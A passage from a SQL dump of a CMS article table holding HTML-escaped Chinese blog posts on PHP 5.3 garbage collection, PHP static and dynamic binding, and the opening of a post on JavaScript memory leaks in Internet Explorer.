/&gt;\r\n&lt;/p&gt;\r\n&lt;p&gt;其中灰色部分表示已经不复存在。由于a之前指向的zval的refcount为1(被其HashTable的第一个元素引用)，这个zval就不会被GC销毁，这部分内存就泄露了。&lt;/p&gt;\r\n&lt;p&gt;这里特别要指出的是，PHP是通过符号表(Symbol Table)存储变量符号的，全局有一个符号表，而每个复杂类型如数组或对象有自己的符号表，因此上面代码中，a和a[0]是两个符号，但是a储存在全局符号表中，而a[0]储存在数组本身的符号表中，且这里a和a[0]引用同一个zval(当然符号a后来被销毁了)。希望读者朋友注意分清符号(Symbol)的zval的关系。&lt;/p&gt;\r\n&lt;p&gt;在PHP只用于做动态页面脚本时，这种泄露也许不是很要紧，因为动态页面脚本的生命周期很短，PHP会保证当脚本执行完毕后，释放其所有资源。但是PHP发展到目前已经不仅仅用作动态页面脚本这么简单，如果将PHP用在生命周期较长的场景中，例如自动化测试脚本或deamon进程，那么经过多次循环后积累下来的内存泄露可能就会很严重。这并不是我在耸人听闻，我曾经实习过的一个公司就通过PHP写的deamon进程来与数据存储服务器交互。&lt;/p&gt;\r\n&lt;p&gt;由于Reference Counting的这个缺陷，PHP5.3改进了垃圾回收算法。&lt;/p&gt;\r\n&lt;p&gt;&lt;strong&gt;PHP5.3中的垃圾回收算法——Concurrent Cycle Collection in Reference Counted Systems&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p&gt;PHP5.3的垃圾回收算法仍然以引用计数为基础，但是不再是使用简单计数作为回收准则，而是使用了一种同步回收算法，这个算法由IBM的工程师在论文Concurrent Cycle Collection in Reference Counted Systems中提出。&lt;/p&gt;\r\n&lt;p&gt;这个算法可谓相当复杂，从论文29页的数量我想大家也能看出来，所以我不打算(也没有能力)完整论述此算法，有兴趣的朋友可以阅读上面的提到的论文(强烈推荐，这篇论文非常精彩)。&lt;/p&gt;\r\n&lt;p&gt;我在这里，只能大体描述一下此算法的基本思想。&lt;/p&gt;\r\n&lt;p&gt;首先PHP会分配一个固定大小的“根缓冲区”，这个缓冲区用于存放固定数量的zval，这个数量默认是10,000，如果需要修改则需要修改源代码Zend/zend_gc.c中的常量GC_ROOT_BUFFER_MAX_ENTRIES然后重新编译。&lt;/p&gt;\r\n&lt;p&gt;由上文我们可以知道，一个zval如果有引用，要么被全局符号表中的符号引用，要么被其它表示复杂类型的zval中的符号引用。因此在zval中存在一些可能根(root)。这里我们暂且不讨论PHP是如何发现这些可能根的，这是个很复杂的问题，总之PHP有办法发现这些可能根zval并将它们投入根缓冲区。&lt;/p&gt;\r\n&lt;p&gt;当根缓冲区满额时，PHP就会执行垃圾回收，此回收算法如下：&lt;/p&gt;\r\n&lt;p&gt;1、对每个根缓冲区中的根zval按照深度优先遍历算法遍历所有能遍历到的zval，并将每个zval的refcount减1，同时为了避免对同一zval多次减1(因为可能不同的根能遍历到同一个zval)，每次对某个zval减1后就对其标记为“已减”。&lt;/p&gt;\r\n&lt;p&gt;2、再次对每个缓冲区中的根zval深度优先遍历，如果某个zval的refcount不为0，则对其加1，否则保持其为0。&lt;/p&gt;\r\n&lt;p&gt;3、清空根缓冲区中的所有根(注意是把这些zval从缓冲区中清除而不是销毁它们)，然后销毁所有refcount为0的zval，并收回其内存。&lt;/p&gt;\r\n&lt;p&gt;如果不能完全理解也没有关系，只需记住PHP5.3的垃圾回收算法有以下几点特性：&lt;/p&gt;\r\n&lt;p&gt;1、并不是每次refcount减少时都进入回收周期，只有根缓冲区满额后在开始垃圾回收。&lt;/p&gt;\r\n&lt;p&gt;2、可以解决循环引用问题。&lt;/p&gt;\r\n&lt;p&gt;3、可以总将内存泄露保持在一个阈值以下。&lt;/p&gt;\r\n&lt;p&gt;&lt;strong&gt;PHP5.2与PHP5.3垃圾回收算法的性能比较&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p&gt;由于我目前条件所限，我就不重新设计试验了，而是直接引用PHP Manual中的实验，关于两者的性能比较请参考PHP Manual中的相关章节：http://www.php.net/manual/en/features.gc.performance-considerations.php。&lt;/p&gt;\r\n&lt;p&gt;首先是内存泄露试验，下面直接引用PHP Manual中的实验代码和试验结果图：&lt;/p&gt;\r\n&lt;pre&gt;&lt;ol class=&quot;dp-c&quot;&gt;&lt;li class=&quot;alt&quot;&gt;&lt;span&gt;&lt;span&gt;&amp;lt;?php &amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt;&lt;span&gt;&amp;nbsp;Foo &amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot;&gt;&lt;span&gt;{ &amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot;&gt;$var&lt;/span&gt;&lt;span&gt;&amp;nbsp;=&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;string&quot;&gt;''3.1415962654''&lt;/span&gt;&lt;span&gt;; &amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot;&gt;&lt;span&gt;} &amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot;&gt;&lt;span class=&quot;vars&quot;&gt;$baseMemory&lt;/span&gt;&lt;span&gt;&amp;nbsp;=&amp;nbsp;memory_get_usage(); &amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;&lt;span&gt;&amp;nbsp;(&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot;&gt;$i&lt;/span&gt;&lt;span&gt;&amp;nbsp;=&amp;nbsp;0;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot;&gt;$i&lt;/span&gt;&lt;span&gt;&amp;nbsp;&amp;lt;=&amp;nbsp;100000;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot;&gt;$i&lt;/span&gt;&lt;span&gt;++&amp;nbsp;) &amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li&gt;&lt;span&gt;{ &amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot;&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot;&gt;$a&lt;/span&gt;&lt;span&gt;&amp;nbsp;=&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt;&lt;span&gt;&amp;nbsp;Foo; &amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot;&gt;$a&lt;/span&gt;&lt;span&gt;-&amp;gt;self&amp;nbsp;=&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot;&gt;$a&lt;/span&gt;&lt;span&gt;; &amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot;&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;&lt;span&gt;&amp;nbsp;(&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot;&gt;$i&lt;/span&gt;&lt;span&gt;&amp;nbsp;%&amp;nbsp;500&amp;nbsp;===&amp;nbsp;0&amp;nbsp;) &amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{ &amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot;&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;func&quot;&gt;echo&lt;/span&gt;&lt;span&gt;&amp;nbsp;sprintf(&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;string&quot;&gt;''%8d:&amp;nbsp;''&lt;/span&gt;&lt;span&gt;,&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot;&gt;$i&lt;/span&gt;&lt;span&gt;&amp;nbsp;),&amp;nbsp;memory_get_usage()&amp;nbsp;-&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot;&gt;$baseMemory&lt;/span&gt;&lt;span&gt;,&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;string&quot;&gt;&quot;\\n&quot;&lt;/span&gt;&lt;span&gt;; &amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;} &amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot;&gt;&lt;span&gt;} &amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li&gt;&lt;span&gt;?&amp;gt; &lt;br /&gt;\r\n&lt;/span&gt;&lt;p&gt;可以看到在可能引发累积性内存泄露的场景下，PHP5.2发生持续累积性内存泄露，而PHP5.3则总能将内存泄露控制在一个阈值以下(与根缓冲区大小有关)。&lt;/p&gt;\r\n&lt;p&gt;另外是关于性能方面的对比：&lt;/p&gt;\r\n&lt;pre&gt;&lt;ol class=&quot;dp-c&quot;&gt;&lt;li class=&quot;alt&quot;&gt;&lt;span&gt;&lt;span&gt;&amp;lt;?php &amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt;&lt;span&gt;&amp;nbsp;Foo &amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot;&gt;&lt;span&gt;{ &amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot;&gt;$var&lt;/span&gt;&lt;span&gt;&amp;nbsp;=&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;string&quot;&gt;''3.1415962654''&lt;/span&gt;&lt;span&gt;; &amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot;&gt;&lt;span&gt;} &amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;&lt;span&gt;&amp;nbsp;(&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot;&gt;$i&lt;/span&gt;&lt;span&gt;&amp;nbsp;=&amp;nbsp;0;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot;&gt;$i&lt;/span&gt;&lt;span&gt;&amp;nbsp;&amp;lt;=&amp;nbsp;1000000;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot;&gt;$i&lt;/span&gt;&lt;span&gt;++&amp;nbsp;) &amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li&gt;&lt;span&gt;{ &amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot;&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot;&gt;$a&lt;/span&gt;&lt;span&gt;&amp;nbsp;=&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt;&lt;span&gt;&amp;nbsp;Foo; &amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot;&gt;$a&lt;/span&gt;&lt;span&gt;-&amp;gt;self&amp;nbsp;=&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot;&gt;$a&lt;/span&gt;&lt;span&gt;; &amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot;&gt;&lt;span&gt;} &amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot;&gt;&lt;span class=&quot;func&quot;&gt;echo&lt;/span&gt;&lt;span&gt;&amp;nbsp;memory_get_peak_usage(),&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;string&quot;&gt;&quot;\\n&quot;&lt;/span&gt;&lt;span&gt;; &amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li&gt;&lt;span&gt;?&amp;gt;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;/ol&gt;\r\n&lt;/pre&gt;&lt;p&gt;这个脚本执行1000000次循环，使得延迟时间足够进行对比。&lt;/p&gt;\r\n&lt;p&gt;然后使用CLI方式分别在打开内存回收和关闭内存回收的的情况下运行此脚本：&lt;/p&gt;\r\n&lt;pre&gt;&lt;ol class=&quot;dp-c&quot;&gt;&lt;li class=&quot;alt&quot;&gt;&lt;span&gt;&lt;span&gt;time&amp;nbsp;php&amp;nbsp;-dzend.enable_gc=0&amp;nbsp;-dmemory_limit=-1&amp;nbsp;-n&amp;nbsp;example2.php &amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li&gt;&lt;span&gt;#&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;keyword&quot;&gt;and&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot;&gt;&lt;span&gt;time&amp;nbsp;php&amp;nbsp;-dzend.enable_gc=1&amp;nbsp;-dmemory_limit=-1&amp;nbsp;-n&amp;nbsp;example2.php&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;/ol&gt;\r\n&lt;/pre&gt;&lt;p&gt;在我的机器环境下，运行时间分别为6.4s和7.2s，可以看到PHP5.3的垃圾回收机制会慢一些，但是影响并不大。&lt;/p&gt;\r\n&lt;p&gt;&lt;strong&gt;与垃圾回收算法相关的PHP配置&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p&gt;可以通过修改php.ini中的zend.enable_gc来打开或关闭PHP的垃圾回收机制，也可以通过调用gc_enable()或&lt;br /&gt;\r\ngc_disable()打开或关闭PHP的垃圾回收机制。在PHP5.3中即使关闭了垃圾回收机制，PHP仍然会记录可能根到根缓冲区，只是当根缓冲区&lt;br /&gt;\r\n满额时，PHP不会自动运行垃圾回收，当然，任何时候您都可以通过手工调用gc_collect_cycles()函数强制执行内存回收。&lt;br /&gt;\r\n&lt;/p&gt;\r\n&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;/li&gt;\r\n&lt;/ol&gt;\r\n&lt;/pre&gt;&lt;p&gt;&lt;span style=&quot;color:#0000ff;&quot;&gt;&lt;em&gt;原文链接：http://www.cnblogs.com/leoo2sk/archive/2011/02/27/php-gc.html&lt;/em&gt;&lt;/span&gt;&lt;/p&gt;\r\n', 1, 1, 0, 0, 1304918112, 1, 'admin'),
(106, 1, '静态绑定与动态绑定', '', '', '&lt;div class=&quot;sum&quot;&gt;&lt;ul class=&quot;summary&quot;&gt;除了限制访问,访问方式也决定哪个方法将被子类调用或哪个属性将被子类访问. 函数调用与函数本身的关联,以及成员访问与变量内存地址间的关系,称为绑定. 在计算机语言中有两种主要的绑定方式?静态绑定和动态绑定. 静态绑定发生于数据结构和数据结构间,程序执行之前. 静态绑定发生于编译期, 因此不能利用任何运行期的信息. 它针对函数调用与函数的主体,或变量与内存中的区块. 因为PHP是一种动态语言,它不使用静态绑定. 但是可以模拟静态绑定.动态绑定则针对运行期产生的访问请求,只用到运行期的可用信息. 在面向对象的代码中,动态绑定意味着..&lt;/ul&gt;\r\n&lt;/div&gt;\r\n&lt;p&gt;除了限制访问,访问方式也决定哪个方法将被子类调用或哪个属性将被子类访问. 函数调用与函数本身的关联,以及成员访问与变量内存地址间的关系,称为绑定. &lt;/p&gt;\r\n&lt;p&gt;在计算机语言中有两种主要的绑定方式?静态绑定和动态绑定. 静态绑定发生于数据结构和数据结构间,程序执行之前. 静态绑定发生于编译期, 因此不能利用任何运行期的信息. 它针对函数调用与函数的主体,或变量与内存中的区块. 因为PHP是一种动态语言,它不使用静态绑定. 但是可以模拟静态绑定.&lt;/p&gt;\r\n&lt;p&gt;动态绑定则针对运行期产生的访问请求,只用到运行期的可用信息. 在面向对象的代码中,动态绑定意味着决定哪个方法被调用或哪个属性被访问,将基于这个类本身而不基于访问范围.&lt;/p&gt;\r\n&lt;p&gt;Public和protected成员的动作类似于PHP的前几个版本中函数的动作,使用动态绑定. 这意味着如果一个方法访问一个在子类中被覆写的类成员,并是一个子类的实例,子类的成员将被访问(而不是访问父类中的成员).&lt;/p&gt;\r\n&lt;p&gt;看图1. 这段代码输出” Hey! I am Son.” 因为当PHP调用getSalutation, 是一个Son的实例,是将Father中的salutation覆写而来. 如果salutation是public的,PHP将产生相同的结果. 覆写方法的操作很类似.在Son中,对于identify的调用绑定到那个方法.&lt;/p&gt;\r\n&lt;p&gt;即使在子类中访问方式被从protected削弱成public, 动态绑定仍然会发生. 按照访问方式使用的原则,增强对于类成员的访问限制是不可能的. 所以把访问方式从public改变成protected不可能进行.&lt;/p&gt;\r\n&lt;p&gt;动态绑定&lt;/p&gt;\r\n&lt;table align=&quot;center&quot; border=&quot;1&quot; cellpadding=&quot;2&quot; cellspacing=&quot;0&quot; width=&quot;400&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;code&quot; bgcolor=&quot;#e6e6e6&quot;&gt;&lt;pre&gt;＜?php &lt;br /&gt;\r\n   class Father &lt;br /&gt;\r\n   { &lt;br /&gt;\r\n       protected $salutation = &quot;Hello there!&quot;; //问候 &lt;br /&gt;\r\n&lt;br /&gt;\r\n       public function getSalutation() &lt;br /&gt;\r\n       { &lt;br /&gt;\r\n           print(&quot;$this-&amp;gt;salutation\\n&quot;); &lt;br /&gt;\r\n           $this-&amp;gt;identify(); &lt;br /&gt;\r\n       } &lt;br /&gt;\r\n&lt;br /&gt;\r\n       protected function identify() &lt;br /&gt;\r\n       { &lt;br /&gt;\r\n           print(&quot;I am Father.&lt;br /&gt;\r\n\\n&quot;); &lt;br /&gt;\r\n       } &lt;br /&gt;\r\n   }; &lt;br /&gt;\r\n&lt;br /&gt;\r\n   class Son extends Father &lt;br /&gt;\r\n   { &lt;br /&gt;\r\n       protected $salutation = &quot;Hey!&quot;;  //父类中的protected $salutation 被覆写 &lt;br /&gt;\r\n&lt;br /&gt;\r\n       protected function identify()    //父类中的protected identify() 被覆写 &lt;br /&gt;\r\n       { &lt;br /&gt;\r\n           print(&quot;I am Son.&lt;br /&gt;\r\n\\n&quot;); &lt;br /&gt;\r\n       } &lt;br /&gt;\r\n   }; &lt;br /&gt;\r\n&lt;br /&gt;\r\n   $obj = new Son(); &lt;br /&gt;\r\n   $obj-&amp;gt;getSalutation();  //输出Hey! I am Son. &lt;br /&gt;\r\n?＞&lt;br /&gt;\r\n&lt;/pre&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;/tbody&gt;\r\n&lt;/table&gt;\r\n&lt;p align=&quot;center&quot;&gt;图1&lt;/p&gt;\r\n&lt;p align=&quot;left&quot;&gt;//注: 在子类中没有覆写getSalutation(),但实际上仍然存在一getSalutation().这个类中的$salutation和identify()&lt;/p&gt;\r\n&lt;p align=&quot;left&quot;&gt;//与Son子类的实例中的getSalutation()方法动态绑定,所以调用Son的实例的getSalutation()方法,&lt;/p&gt;\r\n&lt;p align=&quot;left&quot;&gt;//将调用Son类中的成员salutation及identify(),而不是父类中的成员salutation及identify().&lt;/p&gt;\r\n&lt;p align=&quot;left&quot;&gt;Private成员只存在于它们所在的类内部. 不像public和protected成员那样,PHP模拟静态绑定. 看例子图2 . 它输出”Hello there! I am Father.”,尽管子类覆写了salutation的值. 脚本将this-&amp;gt;salutation和当前类Father绑定. 类似的原则应用于private方法identify().&lt;/p&gt;\r\n&lt;p align=&quot;left&quot;&gt;Binding and private members&lt;/p&gt;\r\n&lt;table align=&quot;center&quot; border=&quot;1&quot; cellpadding=&quot;2&quot; cellspacing=&quot;0&quot; width=&quot;400&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;code&quot; bgcolor=&quot;#e6e6e6&quot;&gt;&lt;pre&gt;＜?php &lt;br /&gt;\r\n   class Father &lt;br /&gt;\r\n   { &lt;br /&gt;\r\n       private $salutation = &quot;Hello there!&quot;; &lt;br /&gt;\r\n&lt;br /&gt;\r\n       public function getSalutation() &lt;br /&gt;\r\n       { &lt;br /&gt;\r\n           print(&quot;$this-&amp;gt;salutation\\n&quot;); &lt;br /&gt;\r\n           $this-&amp;gt;identify(); &lt;br /&gt;\r\n       } &lt;br /&gt;\r\n&lt;br /&gt;\r\n       private function identify() &lt;br /&gt;\r\n       { &lt;br /&gt;\r\n           print(&quot;I am Father.&lt;br /&gt;\r\n\\n&quot;); &lt;br /&gt;\r\n       } &lt;br /&gt;\r\n   } &lt;br /&gt;\r\n&lt;br /&gt;\r\n   class Son extends Father &lt;br /&gt;\r\n   { &lt;br /&gt;\r\n       private $salutation = &quot;Hey!&quot;; &lt;br /&gt;\r\n       private function identify() &lt;br /&gt;\r\n       { &lt;br /&gt;\r\n           print(&quot;I am Son.&lt;br /&gt;\r\n\\n&quot;); &lt;br /&gt;\r\n       } &lt;br /&gt;\r\n   } &lt;br /&gt;\r\n&lt;br /&gt;\r\n   $obj = new Son(); &lt;br /&gt;\r\n   $obj-&amp;gt;getSalutation(); //输出Hello there! I am Father. &lt;br /&gt;\r\n?＞&lt;br /&gt;\r\n&lt;/pre&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;/tbody&gt;\r\n&lt;/table&gt;\r\n&lt;p align=&quot;center&quot;&gt;图2 &lt;/p&gt;\r\n&lt;p align=&quot;left&quot;&gt;动态绑定的好处是允许继承类来改变父类的行为,同时可以保持父类的接口和功能. 看例子图3. 由于使用了动态绑定,在deleteUser中被调用的isAuthorized的version 可以由对象的类型来确定. 如果是一个普通的user,PHP调用User::isAuthorized会返回FALSE.如果是一个AuthorizedUser的实例,PHP调用AuthorizedUser::isAuthorized,将允许deleteUser顺利执行.&lt;/p&gt;\r\n&lt;p align=&quot;left&quot;&gt;//haohappy注:用一句话说清楚,就是对象类型与方法,属性绑定. 调用一个父类与子类中都存在的方法或访问一个属性时,会先判断实例属于哪种对象类型,再调用相应的类中的方法和属性.&lt;/p&gt;\r\n&lt;p align=&quot;left&quot;&gt;动态绑定的好处&amp;nbsp;&lt;/p&gt;\r\n&lt;table align=&quot;center&quot; border=&quot;1&quot; cellpadding=&quot;2&quot; cellspacing=&quot;0&quot; width=&quot;400&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;code&quot; bgcolor=&quot;#e6e6e6&quot;&gt;&lt;pre&gt;＜?php &lt;br /&gt;\r\n   class User //用户 &lt;br /&gt;\r\n   { &lt;br /&gt;\r\n       protected function isAuthorized()  //是否是验证用户 &lt;br /&gt;\r\n       { &lt;br /&gt;\r\n           return(FALSE); &lt;br /&gt;\r\n       } &lt;br /&gt;\r\n&lt;br /&gt;\r\n       public function getName()  //获得名字 &lt;br /&gt;\r\n       { &lt;br /&gt;\r\n           return($this-&amp;gt;name); &lt;br /&gt;\r\n       } &lt;br /&gt;\r\n&lt;br /&gt;\r\n       public function deleteUser($username) //删除用户 &lt;br /&gt;\r\n       { &lt;br /&gt;\r\n           if(!$this-&amp;gt;isAuthorized()) &lt;br /&gt;\r\n           { &lt;br /&gt;\r\n               print(&quot;You are not authorized.&lt;br /&gt;\r\n\\n&quot;); &lt;br /&gt;\r\n               return(FALSE); &lt;br /&gt;\r\n           } &lt;br /&gt;\r\n&lt;br /&gt;\r\n           //delete the user &lt;br /&gt;\r\n           print(&quot;User deleted.&lt;br /&gt;\r\n\\n&quot;); &lt;br /&gt;\r\n       } &lt;br /&gt;\r\n   } &lt;br /&gt;\r\n&lt;br /&gt;\r\n   class AuthorizedUser extends User //认证用户 &lt;br /&gt;\r\n   { &lt;br /&gt;\r\n       protected function isAuthorized() //覆写isAuthorized() &lt;br /&gt;\r\n       { &lt;br /&gt;\r\n           return(TRUE); &lt;br /&gt;\r\n       } &lt;br /&gt;\r\n   } &lt;br /&gt;\r\n&lt;br /&gt;\r\n   $user = new User; &lt;br /&gt;\r\n   $admin = new AuthorizedUser; &lt;br /&gt;\r\n&lt;br /&gt;\r\n   //not authorized &lt;br /&gt;\r\n   $user-&amp;gt;deleteUser(&quot;Zeev&quot;); &lt;br /&gt;\r\n&lt;br /&gt;\r\n   //authorized &lt;br /&gt;\r\n   $admin-&amp;gt;deleteUser(&quot;Zeev&quot;); &lt;br /&gt;\r\n?＞ &lt;br /&gt;\r\n&lt;/pre&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;/tbody&gt;\r\n&lt;/table&gt;\r\n&lt;p&gt;为什么private的类成员模拟静态绑定? 为了回答这个问题, 你需要回忆一下为什么需要有private成员.什么时候用它们来代替protected成员是有意义的?&lt;/p&gt;\r\n&lt;p&gt;private成员只有当你不想让子类继承改变或特殊化父类的行为时才用到. 这种情况比你想像的要少. 通常来说,一个好的对象分层结构应当允许绝大多数功能被子类特殊化,改进,或改变?这是面向对象编程的基础之一. 一定的情况下需要private方法或变量,例如当你确信你不想允许子类改变父类中的某个特定的部份. &lt;/p&gt;\r\n', 1, 1, 0, 0, 1304918191, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(107, 1, '说说JS在IE中的内存泄露问题', '', '', '先说说什么是内存泄露，在一个进程中，如果某一块内存无法访问，且直到进程结束为止也无法释放，那么就发生了内存泄露。通常这种情况发生在C++之类的手动管理内存的语言编写的程序中，程序员忘记delete或者free会导致内存泄露。本文主要讨论的是浏览器中的内存泄露问题，也就是说,javas&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;wbr&gt;cript程序导致的内存泄露。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;目前为止最权威的关于浏览器内存泄露的文章应该是以下2篇 分别来自微软的&lt;a href=&quot;http://msdn2.microsoft.com/en-us/library/bb250448.aspx&quot;&gt;Understanding and Solving Internet Explorer Leak Patterns&lt;/a&gt;(&lt;a href=&quot;http://birdshome.cnblogs.com/archive/2006/05/28/ie_memoryleak.html&quot;&gt;中文版&lt;/a&gt;)和来自IBM的&lt;a href=&quot;http://www.ibm.com/developerworks/web/library/wa-memleak/?s_tact=105agx52&amp;amp;s_cmp=cn-a-wa&quot;&gt;Memory leak patterns in JavaS&lt;wbr&gt;cript&lt;/a&gt;(&lt;a href=&quot;http://www.ibm.com/developerworks/cn/web/wa-memleak/index.html?s_tact=105agx52&amp;amp;s_cmp=techcsdn&quot;&gt;中文版&lt;/a&gt;)&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp; &amp;nbsp;&amp;nbsp; &amp;nbsp; 但是这2篇对js语言的认识不够深入，所以讨论的内存泄露问题和解决方案都存在一些偏差。更重要的是，他们太老了，没有介绍IE7的内存泄露新模式。希望本文下面的部分能让读到此文的人更加清晰的认识内存泄露问题。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;1.javas&lt;wbr&gt;cript对象的基础知识&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;(1)创建对象&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;js中创建对象的方式非常自由，通常有这样几种：直接量、new表达式、内置函数、函数调用。后面是几个例子：&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;直接量：{&quot;a&quot;:10,&quot;b&quot;:30}&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;new表达式：var o=new cls();&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;内置函数：var e=document.createElement(&quot;div&quot;);var a=new ActiveXObject(&quot;XML2.0.XMLHTTP&quot;);&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;函数调用：function f(){};f();&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;(2)特殊的对象——作用域对象&lt;/p&gt;\r\n&lt;p 